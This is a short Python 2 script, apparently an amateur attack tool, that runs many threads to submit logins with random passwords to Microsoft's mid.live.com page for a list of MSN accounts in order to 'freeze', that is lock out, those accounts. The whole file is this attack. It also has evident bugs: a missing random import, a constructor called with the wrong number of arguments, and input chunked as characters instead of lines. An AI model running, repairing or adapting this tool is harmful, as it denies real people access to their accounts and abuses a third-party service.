"""Made By Toki and revisited by venam => Now VENAMTEAM"""
from mechanize import Browser
import threading

############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################



####################Begining of class FREEZE   ###########################
class freeze(threading.Thread):

    def __init__(self, id, msn):
        self.id = id
        self.msn = msn
        self.running = False
        threading.Thread.__init__(self)

    #generate random password
    def randompass(self):
        password=""
        for i in xrange(11):
            password+=random.choice('1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW')
        return password

    def spam(self,msn):
        while 1:
            br = Browser()
            br.set_handle_robots(False)
            br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
            br.open('https://mid.live.com/si/login.aspx')
            br.select_form(nr=0)
            br.form['LoginTextBox'] = msn
            br.form['PasswordTextBox'] = self.randompass()
            br.submit()
            print "New Spam"
    def run(self):
        for email in self.msn:
            while email.endswith("\n"):
                email = email[:-1]
            while email.endswith("\r"):
                email = email[:-1]
            email = email.lower()
            self.spam(email)
####################END of class FREEZE   ###########################



##################       MENU         ##################################
msn = raw_input("Msn list to freeze:\n=> ")
nbthread= input("Enter the number of threads working at the same time:\n=> ")
z = chunkIt(msn, nbthread)
for i, i2 in enumerate(z):
    Mythread = freeze(i,i2,msn)
    Mythread.start()
################## END OF   MENU         ##################################


